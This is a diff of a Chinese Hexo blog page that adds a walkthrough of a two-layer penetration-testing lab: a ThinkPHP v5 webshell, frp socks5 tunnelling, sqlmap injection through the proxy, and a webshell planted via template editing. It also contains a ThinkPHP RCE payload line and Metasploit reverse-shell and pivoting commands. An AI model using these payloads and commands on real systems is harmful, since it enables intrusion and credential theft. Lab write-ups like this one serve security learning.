@@ -1,4 +1,4 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>red1 | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title> | blog</title><script src="https://cdn.bootcss.com/valine/1.4.4/Valine.min.js"></script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
  font-family: BenderLight;
  src: local('Bender'), url("/font/BenderLight.ttf");
 }
@@ -6,7 +6,99 @@
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 }</style><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
-</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1>red1</h1><hr></div><div id="post-content"><div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/09/13/ctf3/">← Prev easy_serialize_php</a><span style="color: #fe2"> | </span><a href="/2021/09/08/XXE-CTF/">XXE_CTF Next →</a><hr></div><div id="bottom-btn"><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
+</head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/schedule/">Synopsis</a></nav></header><main style="flex-direction: row-reverse"><article><div id="post-bg"><div id="post-title"><h1></h1><hr></div><div id="post-content"><p>title: vul-1<br>date: 2021-09-12 16:15:28<br>tags: vulstrack<br>categories: 渗透实战</p>
+<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul-1"></a>vul-1</h3><h4 id="第一层主机"><a href="#第一层主机" class="headerlink" title="[第一层主机]"></a>[第一层主机]</h4><ul>
+<li><p>打开<a target="_blank" rel="noopener" href="http://10.203.87.107/%E9%9D%B6%E5%9C%BA%EF%BC%8CThinkPHP">http://10.203.87.107/靶场，ThinkPHP</a> V5映入眼帘</p>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160243.png" alt="QQ截图20210916160243"></p>
+</li>
+<li><p>这个经典的CMS见了很多次了，祭出大哥搜寻到的神器，直接传🐎</p>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160625.png" alt="QQ截图20210916160625"></p>
+</li>
+<li><p>蚁剑链接，链接成功 getshell</p>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160817.png" alt="QQ截图20210916160817"></p>
+</li>
+</ul>
+<h4 id="第二层主机"><a href="#第二层主机" class="headerlink" title="[第二层主机]"></a>[第二层主机]</h4><ul>
+<li>获取主机信息，发现了其为双网卡，直接访问其另一块网卡无法成功，应该是在该主机的内网上，判断是为<code>192.168.22.0/24</code>网段的第二层主机</li>
+</ul>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916160937.png" alt="QQ截图20210916160937"></p>
+<ul>
+<li>使用frp将其流量代理出来</li>
+</ul>
+<p>构造修改<code>frpc.ini</code>中的配置，并把<code>frpc</code>和<code>frpc.ini</code>上传到蚁剑上，并修改权限为<code>0777</code></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">10.203</span>.<span class="number">87.175</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8520</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916161621.png" alt="QQ截图20210916161621"></p>
+<ul>
+<li>在虚拟机上使用运行<code>frps</code>对靶场进行监听，在第一层主机运行<code>frpc</code>进行流量的转发，对浏览器进行代理后，访问其所有c段，最总发现第二层主机IP为<code>192.168.22.129</code></li>
+</ul>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916162521.png" alt="QQ截图20210916162521"></p>
+<ul>
+<li>打开靶场后又是一个CMS</li>
+</ul>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916162318.png" alt="QQ截图20210916162318"></p>
+<ul>
+<li>原本是想找CMS的版本来着，没想到在源码中找到了提示信息，一个SQL注入点</li>
+</ul>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210915134121.png" alt="QQ截图20210915134121"></p>
+<ul>
+<li>使用sqlmap对其进行爆破</li>
+</ul>
+<p>因为此时使用socks5代理访问的网站，所以在使用sqlmap的时候也需要对其进行代理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --proxy=socks5://10.203.87.175:8520 -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> -p keyword</span><br></pre></td></tr></table></figure>
+
+<p><code>dump</code>后得到后台登录账号和密码</p>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210915144541.png" alt="QQ截图20210915144541"></p>
+<ul>
+<li>后台地址为<code>http://192.168.22.129/index.php?r=admini</code>,输入账号密码后进入后台</li>
+</ul>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210916163251.png" alt="QQ截图20210916163251"></p>
+<ul>
+<li>在改后台的模板选项中，可以任意编辑文件内容，在报错界面传🐎</li>
+</ul>
+<p><img src="/2021/09/12/red1/QQ%E6%88%AA%E5%9B%BE20210917154707.png" alt="QQ截图20210917154707"></p>
+<ul>
+<li>蚁剑链接,getshell</li>
+</ul>
+<h3 id="深入了解"><a href="#深入了解" class="headerlink" title="深入了解"></a>深入了解</h3><h5 id="ThinkPHP-v5漏洞解析"><a href="#ThinkPHP-v5漏洞解析" class="headerlink" title="ThinkPHP v5漏洞解析"></a>ThinkPHP v5漏洞解析</h5><ul>
+<li>漏洞简介</li>
+</ul>
+<p>由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞</p>
+<p>实际上就是 <strong>程序未对控制器进行过滤，导致攻击者可以用<code>\</code>调用任意类方法</strong></p>
+<ul>
+<li>影响版本</li>
+</ul>
+<p>5.0 – 5.1</p>
+<ul>
+<li>漏洞原理以及利用方法</li>
+</ul>
+<p>文件路径 ：\thinkphp\library\thin\Request.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 当前的请求类型</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span>  bool $origin  是否获取原始请求类型</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"><span class="variable">$origin</span> = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$origin</span>) &#123;</span><br><span class="line">           <span class="comment">// 获取原始请求类型</span></span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_method&#x27;</span>]])) &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;method    = strtoupper(<span class="variable">$_POST</span>[<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_method&#x27;</span>]]);</span><br><span class="line">               <span class="variable">$method</span>          = strtolower(<span class="keyword">$this</span>-&gt;method);</span><br><span class="line">               <span class="keyword">$this</span>-&gt;&#123;<span class="variable">$method</span>&#125; = <span class="variable">$_POST</span>;</span><br><span class="line">           &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>)) &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;method = strtoupper(<span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;HTTP_X_HTTP_METHOD_OVERRIDE&#x27;</span>));</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">$this</span>-&gt;method = <span class="keyword">$this</span>-&gt;server(<span class="string">&#x27;REQUEST_METHOD&#x27;</span>) ?: <span class="string">&#x27;GET&#x27;</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>其中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;method    = strtoupper(<span class="variable">$_POST</span>[<span class="keyword">$this</span>-&gt;config[<span class="string">&#x27;var_method&#x27;</span>]]);</span><br><span class="line"><span class="variable">$method</span> = strtolower(<span class="keyword">$this</span>-&gt;method); </span><br><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="variable">$method</span>&#125; = <span class="variable">$_POST</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>$method</code>变量是<code>$this-&gt;method</code>, 其同等于POST的<code>“_method”</code>参数值，该处存在一个变量覆盖，我们可以覆盖<code>$filter</code>属性值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=exec&amp;f=calc.exe&amp;&amp;_method=filter&amp;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问后会出现一个警告级别的异常，导致程序终止，</p>
+<h5 id="msf的使用"><a href="#msf的使用" class="headerlink" title="msf的使用"></a>msf的使用</h5><h6 id="msfvenom制作木马"><a href="#msfvenom制作木马" class="headerlink" title="msfvenom制作木马"></a>msfvenom制作木马</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show payloads  <span class="comment">#查看所有payload，根据系统和需要构造 msfvenom木马</span></span><br><span class="line">msfvenom -p payload lhost=本机ip lport=端口 -f 写入文件格式 &gt; 写入文件名</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="exploit模块"><a href="#exploit模块" class="headerlink" title="exploit模块"></a>exploit模块</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler   <span class="comment">#进入管理工具</span></span><br><span class="line">options <span class="comment">#查看攻击配置</span></span><br><span class="line"><span class="built_in">set</span> lport 端口号/lhost 攻击机本机/payload payload <span class="comment">#设置</span></span><br><span class="line">run <span class="comment">#监听目标机流量，getshell</span></span><br><span class="line"><span class="comment">#msfvenom生成木马需要传入到攻击机</span></span><br><span class="line">sessions -i	<span class="comment">#查看监听会话</span></span><br><span class="line">sessions -i -数字 <span class="comment">#进入会话</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="meterperter模块"><a href="#meterperter模块" class="headerlink" title="meterperter模块"></a>meterperter模块</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getuid 	<span class="comment">#查看当前权限</span></span><br><span class="line">sysinfo <span class="comment">#显示远程主机系统信息</span></span><br><span class="line">route 	<span class="comment">#查看路由信息</span></span><br><span class="line">route add -s 网段 <span class="comment">#添加路由</span></span><br><span class="line">search socks	<span class="comment">#寻找代理模块	</span></span><br><span class="line">vim /etc/proxychains4.conf	<span class="comment">#配置msf本地代理</span></span><br></pre></td></tr></table></figure><div id="paginator"></div></div><div id="post-footer"><hr><a href="/2021/09/13/ctf3/">← Prev easy_serialize_php</a><span style="color: #fe2"> | </span><a href="/2021/09/08/XXE-CTF/">XXE_CTF Next →</a><hr></div><div id="bottom-btn"><a id="to-index" href="#post-index" title="index">≡</a><a id="to-top" href="#post-title" title="to top">∧</a></div><div id="Valine"></div><script>new Valine({
  el: '#Valine'
  , appId: ''
  , appKey: ''
